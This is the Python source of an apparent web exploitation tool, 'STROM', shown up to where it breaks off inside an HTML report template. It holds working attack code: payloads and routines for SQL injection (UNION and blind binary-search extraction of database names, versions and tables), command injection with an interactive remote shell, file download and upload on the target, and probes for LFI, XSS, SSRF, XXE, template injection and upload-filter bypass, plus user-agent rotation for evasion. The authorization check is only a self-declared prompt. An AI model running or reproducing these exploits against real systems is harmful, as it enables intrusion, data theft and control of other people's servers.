#!/usr/bin/env python3
import requests
import socket
import re
import random
import time
import json
import base64
import readline
import hashlib
import urllib.parse
from datetime import datetime
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.payloads import PayloadGenerator
from utils.logger import setup_logger

logger = setup_logger('exploiter')

class AdvancedExploiter:
    def __init__(self):
        self.payloads = PayloadGenerator()
        self.session = requests.Session()
        self.results = []
        self.authorized = False
        self.target_info = {}
        
        # Randomize user agents for evasion
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        })
        
        self.exploit_db = {
            'SQLi': {
                'techniques': ['boolean', 'time', 'error', 'union', 'blind'],
                'payloads': self.payloads.generate_sqli_payloads()
            },
            'RCE': {
                'techniques': ['command_injection', 'deserialization'],
                'payloads': self.payloads.generate_rce_payloads()
            },
            'XSS': {
                'techniques': ['reflected', 'stored', 'dom'],
                'payloads': self.payloads.generate_xss_payloads()
            },
            'LFI': {
                'techniques': ['path_traversal', 'wrapper_abuse'],
                'payloads': self.payloads.generate_lfi_payloads()
            },
            'SSRF': {  # NEW
                'techniques': ['basic', 'blind', 'cloud_metadata'],
                'payloads': self.payloads.generate_ssrf_payloads()
            },
            'XXE': {  # NEW
                'techniques': ['classic', 'blind', 'oob'],
                'payloads': self.payloads.generate_xxe_payloads()
            },
            'Deserialization': {  # NEW
                'techniques': ['php', 'java', 'python'],
                'payloads': []
            },
            'Template Injection': {  # NEW
                'techniques': ['jinja2', 'twig', 'freemarker'],
                'payloads': []
            },
            'File Upload': {  # NEW
                'techniques': ['bypass_extension', 'bypass_mime', 'bypass_content'],
                'payloads': []
            }
        }

    def verify_authorization(self, target):
        """Verify testing authorization before proceeding"""
        print(colored("\n" + "="*70, 'yellow'))
        print(colored("           PENETRATION TESTING AUTHORIZATION", 'red', attrs=['bold']))
        print(colored("="*70, 'yellow'))
        print(colored("\n[!] LEGAL DISCLAIMER:", 'red', attrs=['bold']))
        print(colored("    Unauthorized access to computer systems is illegal.", 'yellow'))
        print(colored("    Ensure you have written permission before proceeding.\n", 'yellow'))
        
        consent = input(colored("[?] Do you have written authorization to test this system? (yes/no): ", 'cyan')).lower()
        if consent != 'yes':
            print(colored("\n[!] Authorization not confirmed. Exiting...", 'red'))
            return False
        
        auth_code = input(colored("[?] Enter authorization reference code (for audit trail): ", 'cyan'))
        tester_name = input(colored("[?] Enter your name/organization: ", 'cyan'))
        
        self.target_info = {
            'target': target,
            'authorization_code': auth_code,
            'tester': tester_name,
            'timestamp': datetime.now().isoformat(),
            'session_id': hashlib.md5(f"{target}{time.time()}".encode()).hexdigest()
        }
        
        # Log authorization
        logger.info(f"Testing authorized - Target: {target}, Auth Code: {auth_code}, Tester: {tester_name}")
        print(colored("\n[+] Authorization verified. Session logged.", 'green'))
        print(colored(f"[+] Session ID: {self.target_info['session_id']}", 'cyan'))
        
        return True

    def run(self):
        try:
            print(colored("\n[+] STROM Advanced Exploitation Module v2.0", 'red', attrs=['bold']))
            target = input(colored("[+] Target URL (http://example.com/page.php?id=1): ", 'blue'))

            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target

            # Verify authorization
            if not self.verify_authorization(target):
                return

            # Fingerprint target
            print(colored("\n[*] Fingerprinting target...", 'yellow'))
            self.fingerprint_target(target)

            # Assess vulnerabilities with multi-threading
            print(colored("\n[*] Starting vulnerability assessment...", 'blue'))
            vulns = self.assess_vulnerabilities_threaded(target)

            if vulns:
                self.execute_exploits(target, vulns)
            else:
                print(colored("[-] No exploitable vulnerabilities found", 'yellow'))
                
                print(colored("\n[*] You can try:", 'cyan'))
                print(colored("  1. Manual RCE shell", 'white'))
                print(colored("  2. Run WAF bypass module (python -m modules.bypass)", 'white'))
                
                choice = input(colored("\n[?] Open manual RCE shell? (y/N): ", 'yellow')).lower()
                if choice == 'y':
                    self.exploit_rce(target)

            # Generate report
            self.generate_report()

        except KeyboardInterrupt:
            print(colored("\n[!] Exploitation aborted by user", 'red'))
            self.generate_report()
        except Exception as e:
            logger.error(f"Exploitation failed: {str(e)}")
            print(colored(f"[!] Error: {str(e)}", 'red'))

    def fingerprint_target(self, url):
        """Fingerprint target server and technologies"""
        try:
            resp = self.session.get(url, timeout=5)
            
            # Extract server info
            server = resp.headers.get('Server', 'Unknown')
            powered_by = resp.headers.get('X-Powered-By', 'Unknown')
            
            print(colored(f"[+] Server: {server}", 'cyan'))
            print(colored(f"[+] Technology: {powered_by}", 'cyan'))
            print(colored(f"[+] Response Time: {resp.elapsed.total_seconds():.2f}s", 'cyan'))
            
            # Detect technologies from response
            tech_patterns = {
                'PHP': r'\.php|PHPSESSID',
                'ASP.NET': r'\.aspx|ASP\.NET_SessionId',
                'Java': r'\.jsp|JSESSIONID',
                'WordPress': r'wp-content|wp-includes',
                'Joomla': r'/components/com_',
                'Drupal': r'/sites/default'
            }
            
            detected_tech = []
            for tech, pattern in tech_patterns.items():
                if re.search(pattern, resp.text, re.IGNORECASE):
                    detected_tech.append(tech)
            
            if detected_tech:
                print(colored(f"[+] Detected: {', '.join(detected_tech)}", 'cyan'))
            
            self.target_info['fingerprint'] = {
                'server': server,
                'powered_by': powered_by,
                'technologies': detected_tech,
                'response_time': resp.elapsed.total_seconds()
            }
            
        except Exception as e:
            logger.debug(f"Fingerprinting failed: {str(e)}")

    def assess_vulnerabilities_threaded(self, target):
        """Assess vulnerabilities using multi-threading"""
        vulns = []
        
        with ThreadPoolExecutor(max_workers=6) as executor:  # Increased workers
            futures = {
                executor.submit(self.check_sqli_advanced, target): 'SQLi',
                executor.submit(self.check_rce_advanced, target): 'RCE',
                executor.submit(self.check_lfi, target): 'LFI',
                executor.submit(self.check_xss, target): 'XSS',
                executor.submit(self.check_ssrf, target): 'SSRF',  # NEW
                executor.submit(self.check_xxe, target): 'XXE',  # NEW
            }
            
            for future in as_completed(futures):
                vuln_type = futures[future]
                try:
                    if future.result():
                        vulns.append(vuln_type)
                except Exception as e:
                    logger.error(f"{vuln_type} check failed: {str(e)}")
        
        return vulns

    def check_sqli_advanced(self, url):
        """Advanced SQL injection detection"""
        print(colored("[*] Testing SQL Injection (Boolean, Time, Error-based)", 'yellow'))
        
        if self.check_boolean_sqli(url):
            return True
        if self.check_time_sqli(url):
            return True
        if self.check_error_sqli(url):
            return True
        
        return False

    def check_boolean_sqli(self, url):
        """Boolean-based blind SQL injection"""
        try:
            baseline = self.session.get(url, timeout=5)
            
            true_payload = f"' OR '1'='1"
            true_resp = self.session.get(f"{url}{true_payload}", timeout=5)
            
            false_payload = f"' AND '1'='2"
            false_resp = self.session.get(f"{url}{false_payload}", timeout=5)
            
            if len(true_resp.text) != len(false_resp.text):
                print(colored("[+] Boolean-based SQL Injection detected!", 'green'))
                self.results.append({
                    'type': 'SQLi',
                    'technique': 'Boolean-based blind',
                    'url': url,
                    'payload': true_payload,
                    'severity': 'HIGH'
                })
                return True
                
        except Exception as e:
            logger.debug(f"Boolean SQLi check failed: {str(e)}")
        
        return False

    def check_time_sqli(self, url):
        """Time-based blind SQL injection"""
        try:
            payloads = self.exploit_db['SQLi']['payloads'][:5]
            
            for payload in payloads:
                if 'SLEEP' in payload or 'WAITFOR' in payload:
                    start_time = time.time()
                    try:
                        self.session.get(f"{url}{payload}", timeout=10)
                        elapsed = time.time() - start_time
                        
                        if elapsed >= 4:
                            print(colored(f"[+] Time-based SQL Injection detected! (Delay: {elapsed:.2f}s)", 'green'))
                            self.results.append({
                                'type': 'SQLi',
                                'technique': 'Time-based blind',
                                'url': url,
                                'payload': payload,
                                'delay': elapsed,
                                'severity': 'HIGH'
                            })
                            return True
                    except requests.exceptions.Timeout:
                        print(colored(f"[+] Time-based SQL Injection detected! (Timeout)", 'green'))
                        return True
                    
        except Exception as e:
            logger.debug(f"Time-based SQLi check failed: {str(e)}")
        
        return False

    def check_error_sqli(self, url):
        """Error-based SQL injection"""
        try:
            error_payloads = ["'", "''", '"', "' OR '1", "' AND 1=CONVERT(int, @@version)-- "]
            sql_errors = ['sql syntax', 'mysql_fetch', 'ora-01', 'postgresql', 'sqlite', 
                         'microsoft sql', 'unclosed quotation']
            
            for payload in error_payloads:
                resp = self.session.get(f"{url}{payload}", timeout=5)
                
                for error in sql_errors:
                    if error in resp.text.lower():
                        print(colored(f"[+] Error-based SQL Injection detected! Error: {error}", 'green'))
                        self.results.append({
                            'type': 'SQLi',
                            'technique': 'Error-based',
                            'url': url,
                            'payload': payload,
                            'error': error,
                            'severity': 'HIGH'
                        })
                        return True
                        
        except Exception as e:
            logger.debug(f"Error-based SQLi check failed: {str(e)}")
        
        return False

    def check_rce_advanced(self, url):
        """Advanced RCE detection"""
        print(colored("[*] Testing Remote Code Execution", 'yellow'))
        
        rce_vectors = [
            ("GET", ";echo strom_rce_test"),
            ("GET", "|whoami"),
            ("GET", "`id`"),
            ("HEADER", "() { :; }; echo strom_rce"),
            ("COOKIE", ";whoami")
        ]
        
        for method, payload in rce_vectors:
            try:
                self.session.headers['User-Agent'] = random.choice(self.user_agents)
                
                if method == "GET":
                    resp = self.session.get(f"{url}{payload}", timeout=5)
                elif method == "HEADER":
                    resp = self.session.get(url, headers={"User-Agent": payload}, timeout=5)
                elif method == "COOKIE":
                    resp = self.session.get(url, cookies={"session": payload}, timeout=5)

                if any(marker in resp.text for marker in ["strom_rce", "uid=", "gid="]):
                    print(colored(f"[+] RCE detected via {method}!", 'green'))
                    self.results.append({
                        'type': 'RCE',
                        'method': method,
                        'url': url,
                        'payload': payload,
                        'severity': 'CRITICAL'
                    })
                    return True
                    
            except Exception as e:
                logger.debug(f"RCE check {method} failed: {str(e)}")
                continue

        return False

    def check_lfi(self, url):
        """Local File Inclusion detection"""
        print(colored("[*] Testing Local File Inclusion", 'yellow'))
        
        lfi_payloads = self.exploit_db['LFI']['payloads'][:10]
        lfi_signatures = ['root:x:0:0', 'daemon:', '[extensions]', '<?php']
        
        for payload in lfi_payloads:
            try:
                resp = self.session.get(f"{url.split('?')[0]}?file={payload}", timeout=5)
                
                for signature in lfi_signatures:
                    if signature in resp.text:
                        print(colored(f"[+] Local File Inclusion detected!", 'green'))
                        self.results.append({
                            'type': 'LFI',
                            'url': url,
                            'payload': payload,
                            'signature_found': signature,
                            'severity': 'HIGH'
                        })
                        return True
                        
            except Exception as e:
                logger.debug(f"LFI check failed: {str(e)}")
        
        return False

    def check_xss(self, url):
        """XSS detection"""
        print(colored("[*] Testing Cross-Site Scripting", 'yellow'))
        
        xss_payloads = self.exploit_db['XSS']['payloads'][:10]
        
        for payload in xss_payloads:
            try:
                resp = self.session.get(f"{url}{payload}", timeout=5)
                
                if payload in resp.text or payload.replace('<', '&lt;') not in resp.text:
                    print(colored(f"[+] XSS detected!", 'green'))
                    self.results.append({
                        'type': 'XSS',
                        'url': url,
                        'payload': payload,
                        'severity': 'MEDIUM'
                    })
                    return True
                    
            except Exception as e:
                logger.debug(f"XSS check failed: {str(e)}")
        
        return False

    def check_ssrf(self, url):
        """SSRF detection"""
        print(colored("[*] Testing Server-Side Request Forgery (SSRF)", 'yellow'))
        
        ssrf_payloads = self.exploit_db['SSRF']['payloads'][:10]
        
        # Test payloads
        for payload in ssrf_payloads:
            try:
                # Try different parameters
                params = ['url', 'uri', 'path', 'file', 'redirect', 'target']
                
                for param in params:
                    test_url = f"{url.split('?')[0]}?{param}={payload}"
                    resp = self.session.get(test_url, timeout=10)
                    
                    # Check for SSRF indicators
                    if any(indicator in resp.text for indicator in ['root:x:', 'daemon:', 'bin/bash']):
                        print(colored(f"[+] SSRF detected via parameter: {param}", 'green'))
                        self.results.append({
                            'type': 'SSRF',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'HIGH'
                        })
                        return True
                        
            except Exception as e:
                logger.debug(f"SSRF check failed: {str(e)}")
        
        return False

    def check_xxe(self, url):
        """XXE detection"""
        print(colored("[*] Testing XML External Entity (XXE)", 'yellow'))
        
        xxe_payloads = self.exploit_db['XXE']['payloads'][:5]
        
        for payload in xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                resp = self.session.post(url, data=payload, headers=headers, timeout=10)
                
                # Check for XXE indicators
                if any(indicator in resp.text for indicator in ['root:x:', 'daemon:', '/etc/passwd']):
                    print(colored(f"[+] XXE vulnerability detected!", 'green'))
                    self.results.append({
                        'type': 'XXE',
                        'url': url,
                        'payload': payload[:100] + '...',
                        'severity': 'HIGH'
                    })
                    return True
                    
            except Exception as e:
                logger.debug(f"XXE check failed: {str(e)}")
        
        return False

    def check_deserialization(self, url):
        """Deserialization vulnerability check"""
        print(colored("[*] Testing Deserialization Vulnerabilities", 'yellow'))
        
        # PHP serialized object
        php_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}'
        
        # Java serialized (Base64)
        java_payload = 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcQB+AAMAAAABWW==/'
        
        payloads = [php_payload, java_payload]
        
        for payload in payloads:
            try:
                # Test in various parameters/cookies
                resp = self.session.get(url, cookies={'data': payload}, timeout=5)
                
                # Check for deserialization errors
                error_indicators = [
                    'unserialize',
                    'ObjectInputStream',
                    '__wakeup',
                    'readObject'
                ]
                
                for indicator in error_indicators:
                    if indicator in resp.text:
                        print(colored(f"[+] Potential Deserialization vulnerability!", 'green'))
                        self.results.append({
                            'type': 'Deserialization',
                            'url': url,
                            'severity': 'CRITICAL'
                        })
                        return True
                        
            except Exception as e:
                logger.debug(f"Deserialization check failed: {str(e)}")
        
        return False
    
    def check_template_injection(self, url):
        """Template injection detection"""
        print(colored("[*] Testing Template Injection", 'yellow'))
        
        # Test payloads for different template engines
        ssti_payloads = [
            "{{7*7}}",  # Jinja2, Twig
            "${7*7}",   # Freemarker, Velocity
            "<%= 7*7 %>",  # ERB
            "#{7*7}",   # Ruby
        ]
        
        for payload in ssti_payloads:
            try:
                test_url = f"{url}{payload}"
                resp = self.session.get(test_url, timeout=5)
                
                # Check if template was executed
                if '49' in resp.text:
                    print(colored(f"[+] Template Injection detected! Payload: {payload}", 'green'))
                    self.results.append({
                        'type': 'Template Injection',
                        'url': url,
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    return True
                    
            except Exception as e:
                logger.debug(f"Template injection check failed: {str(e)}")
        
        return False
    
    def check_file_upload_bypass(self, url):
        """File upload bypass detection"""
        print(colored("[*] Testing File Upload Bypass", 'yellow'))
        
        # Create test payloads
        bypass_extensions = [
            'test.php',
            'test.php5',
            'test.phtml',
            'test.php.jpg',
            'test.jpg.php',
            'test.php%00.jpg',
            'test.php;.jpg',
        ]
        
        for ext_file in bypass_extensions:
            try:
                files = {'file': (ext_file, '<?php echo "test"; ?>', 'application/x-php')}
                
                # Try to find upload endpoint
                upload_endpoints = ['/upload', '/upload.php', '/fileupload', '/api/upload']
                
                for endpoint in upload_endpoints:
                    upload_url = url.split('?')[0].rstrip('/') + endpoint
                    
                    try:
                        resp = self.session.post(upload_url, files=files, timeout=5)
                        
                        if resp.status_code == 200 and any(indicator in resp.text for indicator in ['success', 'uploaded', 'complete']):
                            print(colored(f"[+] File upload possible with: {ext_file}", 'green'))
                            self.results.append({
                                'type': 'File Upload Bypass',
                                'url': upload_url,
                                'filename': ext_file,
                                'severity': 'HIGH'
                            })
                            return True
                    except:
                        continue
                        
            except Exception as e:
                logger.debug(f"File upload check failed: {str(e)}")
        
        return False

    def execute_exploits(self, target, vulns):
        print(colored(f"\n[âš¡] Launching {len(vulns)} exploits...", 'red'))

        for vuln in vulns:
            if vuln == 'SQLi':
                self.exploit_sqli(target)
            elif vuln == 'RCE':
                self.exploit_rce(target)
            elif vuln == 'LFI':
                print(colored("\n[*] LFI detected - use manual file extraction", 'cyan'))
            elif vuln == 'XSS':
                print(colored("\n[*] XSS detected - verify in browser", 'cyan'))

    def find_column_count(self, url, max_columns=10):
        """Find column count for UNION-based SQLi"""
        for i in range(1, max_columns + 1):
            payload = "' UNION SELECT " + ",".join(["NULL"] * i) + "-- -"
            try:
                resp = self.session.get(url + payload, timeout=5)
                if resp.status_code == 200 and "error" not in resp.text.lower():
                    return i
            except:
                continue
        return None

    def exploit_sqli(self, url):
        print(colored("\n[+] Exploiting SQL Injection", 'magenta'))

        try:
            col_count = self.find_column_count(url)
            if not col_count:
                print(colored("[-] Failed to determine column count", 'yellow'))
                print(colored("[*] Attempting blind SQL injection...", 'yellow'))
                self.exploit_blind_sqli(url)
                return

            print(colored(f"[+] Column count: {col_count}", 'cyan'))
            
            # Find injectable column
            injectable_col = self.find_injectable_column(url, col_count)
            if not injectable_col:
                print(colored("[-] No injectable column found", 'yellow'))
                return
            
            print(colored(f"[+] Injectable column: {injectable_col}", 'cyan'))

            # Extract information
            marker = "STROM_"
            injected = [f"concat('{marker}',user(),'|',database(),'|',version(),'{marker}')" if i == injectable_col else "NULL" for i in range(1, col_count + 1)]
            payload = "' UNION SELECT " + ",".join(injected) + "-- -"
            resp = self.session.get(f"{url}{payload}", timeout=10)

            matches = re.search(rf'{marker}(.*?)\|(.*?)\|(.*?){marker}', resp.text)
            if matches:
                user = matches.group(1)
                db = matches.group(2)
                version = matches.group(3)
                print(colored(f"[+] Database User: {user}", 'cyan'))
                print(colored(f"[+] Current Database: {db}", 'cyan'))
                print(colored(f"[+] DB Version: {version}", 'cyan'))
                
                # Attempt to extract tables
                self.extract_tables(url, col_count, injectable_col, db)
            else:
                print(colored("[-] Could not extract information", 'yellow'))

        except Exception as e:
            logger.error(f"SQLi exploit failed: {str(e)}")

    def find_injectable_column(self, url, col_count):
        """Find which column is injectable"""
        for i in range(1, col_count + 1):
            injected = ["CONCAT('STROM',1234,'STROM')" if j == i else "NULL" for j in range(1, col_count + 1)]
            payload = "' UNION SELECT " + ",".join(injected) + "-- -"
            
            try:
                resp = self.session.get(f"{url}{payload}", timeout=5)
                if "STROM1234STROM" in resp.text:
                    return i
            except:
                continue
        
        return None

    def extract_tables(self, url, col_count, injectable_col, database):
        """Extract table names from database"""
        print(colored("\n[*] Extracting table names...", 'yellow'))
        
        try:
            injected = [f"GROUP_CONCAT(table_name SEPARATOR '|')" if i == injectable_col else "NULL" for i in range(1, col_count + 1)]
            payload = f"' UNION SELECT {','.join(injected)} FROM information_schema.tables WHERE table_schema='{database}'-- -"
            
            resp = self.session.get(f"{url}{payload}", timeout=10)
            
            # Extract table names
            tables = re.findall(r'(\w+)\|', resp.text)
            if tables:
                print(colored(f"[+] Found {len(tables)} tables:", 'green'))
                for table in tables[:10]:  # Show first 10
                    print(colored(f"    - {table}", 'cyan'))
            
        except Exception as e:
            logger.debug(f"Table extraction failed: {str(e)}")

    def exploit_blind_sqli(self, url):
        """Exploit blind SQL injection using binary search"""
        print(colored("\n[*] Exploiting blind SQL injection...", 'magenta'))
        
        try:
            # Extract database name
            db_name = self.binary_search_extract(url, "SELECT database()")
            if db_name:
                print(colored(f"[+] Database: {db_name}", 'cyan'))
            
            # Extract version
            version = self.binary_search_extract(url, "SELECT version()")
            if version:
                print(colored(f"[+] Version: {version}", 'cyan'))
                
        except Exception as e:
            logger.error(f"Blind SQLi exploit failed: {str(e)}")

    def binary_search_extract(self, url, query, max_length=50):
        """Extract data using binary search in blind SQLi"""
        result = ""
        
        for position in range(1, max_length):
            found_char = False
            
            # Binary search for ASCII value
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}-- -"
                
                try:
                    resp = self.session.get(f"{url}{payload}", timeout=5)
                    baseline = self.session.get(url, timeout=5)
                    
                    if len(resp.text) != len(baseline.text):
                        low = mid + 1
                    else:
                        high = mid - 1
                        
                except:
                    break
            
            if low <= 126:
                result += chr(low)
                found_char = True
                print(f"\r[*] Extracted: {result}", end='', flush=True)
            
            if not found_char:
                break
        
        print()  # New line
        return result if result else None

    def exploit_rce(self, url):
        print(colored("\n[!] WARNING: RCE exploitation started", 'red', attrs=['bold']))
        print(colored("[!] All commands are logged for audit purposes\n", 'yellow'))

        command_history = []
        
        while True:
            try:
                cmd = input(colored("rce-shell> ", 'red', attrs=['bold']))
                
                if not cmd.strip():
                    continue
                    
                if cmd.lower() in ['exit', 'quit']:
                    print(colored("[*] Exiting RCE shell...", 'yellow'))
                    break
                    
                elif cmd.startswith("download "):
                    file_path = cmd.split(" ", 1)[1]
                    self.download_file(url, file_path)
                    continue
                    
                elif cmd.startswith("upload "):
                    parts = cmd.split(" ")
                    if len(parts) >= 3:
                        local_file = parts[1]
                        remote_path = parts[2]
                        self.upload_file(url, local_file, remote_path)
                    else:
                        print(colored("[!] Usage: upload <local_file> <remote_path>", 'yellow'))
                    continue
                    
                elif cmd == "help":
                    self.show_rce_help()
                    continue

                # Log command
                command_history.append({
                    'timestamp': datetime.now().isoformat(),
                    'command': cmd
                })
                logger.info(f"RCE Command executed: {cmd}")

                # Execute command with multiple encoding attempts
                output = self.execute_rce_command(url, cmd)
                
                if output:
                    print(colored("\n[Output]:", 'cyan'))
                    # Limit output display
                    if len(output) > 2000:
                        print(output[:2000])
                        print(colored(f"\n... (truncated, {len(output)} bytes total)", 'yellow'))
                        
                        save = input(colored("[?] Save full output to file? (y/N): ", 'yellow')).lower()
                        if save == 'y':
                            filename = f"rce_output_{int(time.time())}.txt"
                            with open(filename, 'w') as f:
                                f.write(output)
                            print(colored(f"[+] Saved to {filename}", 'green'))
                    else:
                        print(output)
                else:
                    print(colored("[-] No output or command failed", 'yellow'))

            except KeyboardInterrupt:
                print(colored("\n[!] Use 'exit' to quit RCE shell", 'yellow'))
            except requests.exceptions.Timeout:
                print(colored("[!] Request timed out - command may still be executing", 'yellow'))
            except Exception as e:
                print(colored(f"[!] Error: {str(e)}", 'red'))
        
        # Save command history
        if command_history:
            self.results.append({
                'type': 'RCE',
                'commands': command_history,
                'url': url
            })

    def execute_rce_command(self, url, cmd):
        """Execute RCE command with multiple techniques"""
        techniques = [
            ('inline', f";echo STROM_START && {cmd} && echo STROM_END"),
            ('pipe', f"|echo STROM_START && {cmd} && echo STROM_END"),
            ('backtick', f"`echo STROM_START && {cmd} && echo STROM_END`"),
            ('subshell', f"$(echo STROM_START && {cmd} && echo STROM_END)")
        ]
        
        for technique_name, payload in techniques:
            try:
                encoded_cmd = urllib.parse.quote(payload)
                resp = self.session.get(f"{url}{encoded_cmd}", timeout=15)
                
                match = re.search(r'STROM_START(.*?)STROM_END', resp.text, re.DOTALL)
                if match:
                    return match.group(1).strip()
                    
            except Exception as e:
                logger.debug(f"RCE technique {technique_name} failed: {str(e)}")
                continue
        
        return None

    def show_rce_help(self):
        """Show RCE shell help"""
        help_text = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    RCE SHELL COMMANDS                        â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  download <path>           Download file from target         â•‘
â•‘  upload <local> <remote>   Upload file to target             â•‘
â•‘  exit/quit                 Exit RCE shell                    â•‘
â•‘  help                      Show this help                    â•‘
â•‘                                                              â•‘
â•‘  Any other command will be executed on target system         â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """
        print(colored(help_text, 'cyan'))

    def upload_file(self, url, local_file, remote_path):
        """Upload file to target system"""
        try:
            print(colored(f"[*] Uploading {local_file} to {remote_path}...", 'blue'))
            
            with open(local_file, 'rb') as f:
                content = f.read()
            
            # Base64 encode for safe transfer
            b64_content = base64.b64encode(content).decode()
            
            # Upload in chunks if large
            chunk_size = 1000
            chunks = [b64_content[i:i+chunk_size] for i in range(0, len(b64_content), chunk_size)]
            
            # Clear target file first
            cmd = f"echo '' > {remote_path}.b64"
            self.execute_rce_command(url, cmd)
            
            # Upload chunks
            for i, chunk in enumerate(chunks):
                cmd = f"echo '{chunk}' >> {remote_path}.b64"
                self.execute_rce_command(url, cmd)
                print(f"\r[*] Progress: {i+1}/{len(chunks)} chunks", end='', flush=True)
            
            # Decode on target
            cmd = f"base64 -d {remote_path}.b64 > {remote_path} && rm {remote_path}.b64"
            self.execute_rce_command(url, cmd)
            
            print(colored(f"\n[+] File uploaded successfully", 'green'))
            
        except FileNotFoundError:
            print(colored(f"[!] Local file not found: {local_file}", 'red'))
        except Exception as e:
            logger.error(f"Upload failed: {str(e)}")
            print(colored(f"[!] Upload failed: {str(e)}", 'red'))

    def download_file(self, url, filepath):
        """Download file from target"""
        try:
            print(colored(f"[*] Downloading file: {filepath}", 'blue'))
            encoded_cmd = urllib.parse.quote(f"echo STROM_START && cat {filepath} && echo STROM_END")
            payload = f";{encoded_cmd}"
            resp = self.session.get(f"{url}{payload}", timeout=10)

            match = re.search(r'STROM_START(.*?)STROM_END', resp.text, re.DOTALL)
            if match:
                content = match.group(1).strip()
                local_name = filepath.replace('/', '_')
                with open(local_name, 'w', encoding='utf-8') as f:
                    f.write(content)
                print(colored(f"[+] File saved as {local_name}", 'green'))
            else:
                print(colored("[-] Failed to extract file content", 'red'))

        except Exception as e:
            logger.error(f"Download failed: {str(e)}")

    def generate_report(self):
        """Generate professional penetration testing report"""
        if not self.results:
            print(colored("\n[*] No results to report", 'yellow'))
            return
        
        print(colored("\n[*] Generating penetration test report...", 'blue'))
        
        report = {
            'test_info': self.target_info,
            'summary': {
                'total_vulnerabilities': len(self.results),
                'critical': sum(1 for r in self.results if r.get('severity') == 'CRITICAL'),
                'high': sum(1 for r in self.results if r.get('severity') == 'HIGH'),
                'medium': sum(1 for r in self.results if r.get('severity') == 'MEDIUM'),
                'low': sum(1 for r in self.results if r.get('severity') == 'LOW')
            },
            'vulnerabilities': self.results,
            'timestamp': datetime.now().isoformat()
        }
        
        # Save JSON report
        json_filename = f"pentest_report_{self.target_info.get('session_id', 'unknown')}.json"
        with open(json_filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Generate HTML report
        html_filename = f"pentest_report_{self.target_info.get('session_id', 'unknown')}.html"
        self.generate_html_report(report, html_filename)
        
        print(colored(f"\n[+] Reports generated:", 'green'))
        print(colored(f"    - JSON: {json_filename}", 'cyan'))
        print(colored(f"    - HTML: {html_filename}", 'cyan'))
        
        # Print summary
        print(colored("\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—", 'yellow'))
        print(colored("â•‘            PENETRATION TEST SUMMARY                  â•‘", 'yellow'))
        print(colored("â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£", 'yellow'))
        print(colored(f"â•‘  Total Vulnerabilities: {len(self.results):^28} â•‘", 'yellow'))
        print(colored(f"â•‘  Critical: {report['summary']['critical']:^38} â•‘", 'red'))
        print(colored(f"â•‘  High: {report['summary']['high']:^42} â•‘", 'yellow'))
        print(colored(f"â•‘  Medium: {report['summary']['medium']:^40} â•‘", 'cyan'))
        print(colored(f"â•‘  Low: {report['summary']['low']:^43} â•‘", 'green'))
        print(colored("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•", 'yellow'))

    def generate_html_report(self, report, filename):
        """Generate HTML report"""
        html_template = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #c00; border-bottom: 3px solid #c00; padding-bottom: 10px; }}
        h2 {{ color: #333; margin-top: 30px; }}
        .info {{ background: #e3f2fd; padding: 15px; border-left: 4px solid #2196f3; margin: 20px 0; }}
        .summary {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }}
